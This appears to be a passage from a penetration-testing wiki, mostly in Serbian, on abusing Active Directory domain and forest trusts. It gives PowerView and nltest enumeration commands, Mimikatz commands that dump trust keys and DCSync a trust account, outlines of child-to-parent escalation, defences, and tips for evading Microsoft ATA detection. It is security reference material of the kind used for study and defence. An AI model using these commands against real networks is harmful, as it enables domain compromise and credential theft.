- **Parent-Child Trusts**: Uobičajena postavka unutar istog foresta, gde child domen automatski ima dvosmerni tranzitivni trust sa svojim parent domenom. Ovo znači da zahtevi za autentikaciju mogu teći neometano između parent-a i child-a.
- **Cross-link Trusts**: Poznati i kao "shortcut trusts", uspostavljaju se između child domena da ubrzaju referral procese. U složenim forest-ovima, autentikacioni referali obično moraju ići do root-a foresta pa zatim nadole do ciljnog domena. Cross-links skraćuju taj put, što je posebno korisno u geografski rasprostranjenim okruženjima.
- **External Trusts**: Postavljaju se između različitih, nepovezanih domena i po prirodi su non-transitive. Prema [Microsoft-ovoj dokumentaciji](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts su korisni za pristup resursima u domenu izvan trenutnog foresta koji nije povezan forest trust-om. Bezbednost se pojačava kroz SID filtering sa external trusts.
- **Tree-root Trusts**: Ovi trustovi se automatski uspostavljaju između forest root domena i novo dodatog tree root-a. Iako se ne sreću često, tree-root trust-ovi su važni pri dodavanju novih tree root-ova u forest, omogućavajući im da zadrže jedinstveno ime domena i osiguravajući dvosmernu transfinitivnost. Više informacija možete naći u [Microsoft-ovom vodiču](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Ovo je dvosmerni tranzitivni trust između dva forest root domena, takođe primenjujući SID filtering radi poboljšanja sigurnosti.
- **MIT Trusts**: Ovi trustovi se uspostavljaju sa non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domenima. MIT trusts su specijalizovaniji i služe za integraciju sa Kerberos-based sistemima izvan Windows ekosistema.

#### Druge razlike u **trust** odnosima

- Trust relacija može biti i **transitivna** (A trust-uje B, B trust-uje C, onda A trust-uje C) ili **non-transitivna**.
- Trust relacija može biti **bidirekcionalna** (oba se međusobno trust-uju) ili **jednosmerna** (samo jedan trust-uje drugog).

### Put napada

1. **Enumerišite** trust relacije
2. Proverite da li bilo koji **security principal** (user/group/computer) ima **pristup** resursima **drugog domena**, možda kroz ACE unose ili članstvom u grupama drugog domena. Tražite **odnose preko domena** (trust je verovatno kreiran upravo zbog ovoga).
1. kerberoast u ovom slučaju može biti još jedna opcija.
3. **Kompromitujte** **naloge** koji mogu **pivot-ovati** kroz domene.

Napadači mogu dobiti pristup resursima u drugom domenu kroz tri primarna mehanizma:

- **Local Group Membership**: Principali mogu biti dodati u lokalne grupe na mašinama, kao što je “Administrators” grupa na serveru, čime im se daje značajna kontrola nad tom mašinom.
- **Foreign Domain Group Membership**: Principali takođe mogu biti članovi grupa unutar stranog domena. Međutim, efikasnost ove metode zavisi od prirode trust-a i opsega grupe.
- **Access Control Lists (ACLs)**: Principali mogu biti specificirani u **ACL-u**, posebno kao entiteti u **ACE-ovima** unutar **DACL-a**, što im pruža pristup specifičnim resursima. Za one koji žele dublje da razumeju mehaniku ACL-ova, DACL-ova i ACE-ova, whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” je neprocenjiv resurs.

### Pronađite eksterne korisnike/grupe sa permisijama

Možete proveriti **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** da biste pronašli foreign security principals u domenu. Ovo će biti korisnici/grupe iz **eksternog domena/foresta**.

Možete ovo proveriti u **Bloodhound** ili koristeći **powerview**:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Drugi načini za enumerisanje poverenja domena:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Postoje **2 pouzdana ključa**, jedan za _Child --> Parent_ i drugi za _Parent_ --> _Child_.\
> Možete proveriti koji ključ koristi trenutni domen pomoću:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalate as Enterprise admin to the child/parent domain abusing the trust with SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Razumevanje kako se Configuration Naming Context (NC) može iskoristiti je ključno. Configuration NC služi kao centralni repozitorij konfiguracionih podataka kroz forest u Active Directory (AD) okruženjima. Ovi podaci se replikuju na svaki Domain Controller (DC) unutar forest-a, pri čemu writable DCs održavaju zapisivu kopiju Configuration NC. Za iskorišćavanje ovoga, potrebno je imati **SYSTEM privilegije na DC-u**, poželjno na child DC-u.

**Link GPO to root DC site**

Kontejner Sites u Configuration NC sadrži informacije o site-ovima svih računara pridruženih domenu unutar AD forest-a. Radeći sa SYSTEM privilegijama na bilo kom DC-u, napadači mogu link-ovati GPO-e ka root DC site-ovima. Ova akcija potencijalno kompromituje root domain manipulišući politikama primenjenim na te sajtove.

For in-depth information, one might explore research on [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Jedan vektor napada uključuje ciljanje privilegovanih gMSA unutar domena. KDS Root key, neophodan za izračunavanje lozinki gMSA-ova, je uskladišten u Configuration NC. Sa SYSTEM privilegijama na bilo kom DC-u, moguće je pristupiti KDS Root key-u i izračunati lozinke za bilo koji gMSA kroz ceo forest.

Detailed analysis and step-by-step guidance can be found in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Ova metoda zahteva strpljenje — čekanje na kreiranje novih privilegovanih AD objekata. Sa SYSTEM privilegijama, napadač može izmeniti AD Schema da dodeli bilo kom korisniku potpunu kontrolu nad svim klasama. To može dovesti do neovlašćenog pristupa i kontrole nad novokreiranim AD objektima.

Further reading is available on [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Ranljivost ADCS ESC5 cilja kontrolu nad Public Key Infrastructure (PKI) objektima kako bi se kreirao certificate template koji omogućava autentifikaciju kao bilo koji korisnik unutar forest-a. Pošto PKI objekti stanuju u Configuration NC, kompromitovanje writable child DC-a omogućava izvršenje ESC5 napada.

More details on this can be read in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenarios lacking ADCS, the attacker has the capability to set up the necessary components, as discussed in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
U ovom scenariju **eksterni domen je postavio trust prema vašem domenu**, dajući vam **neodređena ovlašćenja** nad njim. Treba da pronađete **koji entiteti vašeg domena imaju koji pristup nad eksternim domenom** i potom pokušate da to iskoristite:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Eksterni domen šume - jednosmerni (izlazni)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
U ovom scenariju **vaš domen** poverava neke **privilegije** principal-u iz **drugog domena**.

Međutim, kada je **domain is trusted** od strane trust-ujućeg domena, trusted domain **kreira user-a** sa **predvidivim imenom** koji koristi kao **password the trusted password**. Što znači da je moguće **pristupiti user-u iz trusting domain-a da se uđe u trusted domen** kako bi se izvršila enumeracija i pokušalo eskaliranje privilegija:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Drugi način da se kompromituje trusted domain je pronalaženje [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) kreiranog u **suprotnoj smeru** od domain trust-a (što nije često).

Drugi način da se kompromituje trusted domain je čekanje na mašini na kojoj **user iz trusted domain-a može pristupiti** i prijaviti se preko **RDP**. Napadač tada može injektovati kod u proces RDP sesije i **pristupiti origin domain-u žrtve** odatle.\
Štaviše, ako je **žrtva mount-ovala svoj hard drive**, iz procesa **RDP session** napadač može postaviti **backdoors** u **startup folder hard drive-a**. Ova tehnika se zove **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- Rizik od napada koji koriste SID history atribut preko forest trust-ova se ublažava korišćenjem SID Filtering-a, koji je aktiviran po default-u na svim inter-forest trust-ovima. Ovo počiva na pretpostavci da su intra-forest trust-ovi sigurni, tretirajući forest, a ne domen, kao sigurnosnu granicu prema Microsoft-ovom stavu.
- Međutim, postoji problem: SID filtering može poremetiti aplikacije i pristup korisnika, što vodi ka njegovom povremenom deaktiviranju.

### **Selective Authentication:**

- Za inter-forest trust-ove, korišćenje Selective Authentication osigurava da korisnici iz dve šume nisu automatski autentifikovani. Umesto toga, potrebna su eksplicitna dopuštenja da bi korisnici pristupili domenima i serverima unutar trusting domena ili šume.
- Važno je napomenuti da ove mere ne štite od iskorišćavanja writable Configuration Naming Context (NC) ili napada na trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Preporučuje se da Domain Admins smeju da se prijavljuju samo na Domain Controllers, izbegavajući njihovu upotrebu na drugim hostovima.
- **Service Account Privileges**: Servisi ne bi trebalo da se pokreću sa Domain Admin (DA) privilegijama radi bezbednosti.
- **Temporal Privilege Limitation**: Za zadatke koji zahtevaju DA privilegije, treba ograničiti njihovo trajanje. Ovo se može postići komandom: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`

### **Implementing Deception Techniques**

- Implementacija deception uključuje postavljanje zamki, kao što su decoy users ili computers, sa karakteristikama kao što su lozinke koje ne ističu ili su označeni kao Trusted for Delegation. Detaljan pristup uključuje kreiranje user-a sa specifičnim pravima ili dodavanje u visoko-privilegovane grupe.
- Praktičan primer uključuje korišćenje alata kao što su: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Više o deploy-ovanju deception tehnika može se naći na [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Sumnjivi indikatori uključuju netipičan ObjectSID, retke logone, datume kreiranja i nizak broj bad password pokušaja.
- **General Indicators**: Poređenje atributa potencijalnih decoy objekata sa pravim objektima može otkriti nedoslednosti. Alati kao što je [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) mogu pomoći u identifikaciji takvih deceptions.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Izbegavanje session enumeration na Domain Controllers da bi se sprečilo ATA detektovanje.
- **Ticket Impersonation**: Korišćenje **aes** ključeva za kreiranje ticket-a pomaže u izbegavanju detekcije tako što se ne degradira na NTLM.
- **DCSync Attacks**: Izvršavanje sa mašine koja nije Domain Controller kako bi se izbegla ATA detekcija se preporučuje, jer direktno izvršavanje sa Domain Controller-a pokreće alert-e.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

{{#include ../../banners/hacktricks-training.md}}
